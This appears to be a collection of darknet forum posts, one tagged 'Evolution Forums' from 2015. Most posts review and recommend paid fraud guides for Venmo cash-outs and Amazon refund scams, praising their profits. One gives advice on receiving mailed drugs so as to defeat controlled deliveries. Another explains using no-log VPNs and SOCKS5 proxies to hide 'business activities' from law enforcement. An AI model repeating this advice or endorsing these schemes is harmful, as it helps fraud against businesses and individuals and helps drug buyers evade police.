highly recommend this guide for people who are veterans and newbies, you are sure to make some money.",""

This is my honest review, no advertising or promoting this guide. FormatEven though everyone has their ways of doing things, I prefer reading a guide if it's on PDF like everyone has stated already guide is short but straight to the point of what you need to get and what you need to do, simple steps that anyone can follow with not much thinking into it but of course if you wanna go further you gotta think outside the box. A guide could be 20 pages long or even more but people nowadays prefer a simple guide that tells them what to do, this is one of them. MethodAs far as method goes I can tell it's fair simple, easy to do and works. Nothing more nothing less. ROIROI comes down to how dedicated you are meanwhile someone can do $500/week with this guide spending a few hours a day, somebody else can do $1k/week spending more time, all depends how much effort and time you put into this but you'll definitely make back your investment as long as you commit. Few things I'd like to see which I believe you fixed already were some security tips for new people getting into this since we know some people don't know how to properly set up their security setup, where you get your resources and of course more methods to cashout since we all know method is gonna get burned no matter what but finding more methods is up to your imagination. Finally, I do recommend this guy is definitely worth it's value I've seen a lot of guides but there's a few I can count with my hand that I like, this is one of them mostly because it's simple, works and it's not copied from some site or someone else.",""

I have gone trough the whole guide, as other users have pointed out adding few sections would make it more noob oriented, which i have believe this guide is winking to. Venmo is traditionally not a straight method to cash out and some approaches are not included in the actual guide, but overall i would say to anybody pointing to a working and (almost) quick way to work and cash out with Venmo this guide is for you. More experienced users might find the guide a bit redundant, but few tricks are worth mention as working quite well. With the few additions suggested by several users i believe this is a must, creative and smart guide, good job.

"Evolution Forums","MartyMcHigh","52449","2015-03-16T00:00:00","Re: Shipping weed home vs drop","Security & Anonymity","Ideally, you use your real name because in the event of a controlled delivery, if you are caught receiving a package for someone elses name, you're automatically guilty (caught red handed) for possessing someone elses property and/or fraud. If you use your real name in a controlled delivery, Law Enforcement have nothing to prove that you ordered the package of drugs in your hands at the time of the controlled delivery. It would be too easy to defend against, it wont even make it to court.  Can you get dox'd by vendors for using your real name and address? Yes. But this is a pretty weak point to worry about. How would the vendor know the address you provided isn't your mates, your aunt's, an empty house, your neighbours, etc.  So weigh the two out. Whats at stake vs how likely it would happen to get in trouble using a fake name vs a vendor doxing you with real info? If you can't decide, use your real name at a drop address that isn't your home. There's plenty of guides from reputable guide vendors on evo that provide great info on this subject. They are almost free and worth the time saved from searching the net. There's a couple vendors that sell tonnes of guides, one is called 'fake' and the other guy is 'smallpenis'. Also if you're planning to buy weed there's this vendor with really great decoy stealth I think his name was 'martymchigh' Anyways have fun shopping mate!",""

Everyone here talks about the VPN providing an extra layer of security, I have a question about the IP of a VPN. When doing ""Business Activities"" does this need to be in the same country as the Socks5 IP? Or does this not matter?

In the event that LE catches on to you and finds out what VPN you're using, they will subpoena the VPN provider and the provider will always comply. There is no free VPN provider which will stand up for their customers in those scenarios.Paid VPNs take customer privacy more seriously, you just need to find one that keeps no logs and has good encryption. As for SOCKS5 IP, it doesn't matter. If you want to assure yourself you can use a VPN IP in the same area as your proxy.",""

The ""Amazon Refund"" was a bubble which has burst now. Practically everyone knows the basic methods, and that's what covered in this guide. Most of the people use a certain clearnet forum for their SE / Amazon Refund needs. This guide is definitely newbie friendly and will suit to anyone who wishes to foray into the world of Amazon Refunds. It covers the most basic of topics and of course, these methods are already tested and they will definitely work their magic. This guide will be really helpful to newbies, though advanced users already know the methods of this guide. My tip : If the price is cut to $15, and the supply is kept infinite, this will definitely be a good guide for newbies. ----------------------------------------------------------------------------------------------------------------------------arcana.
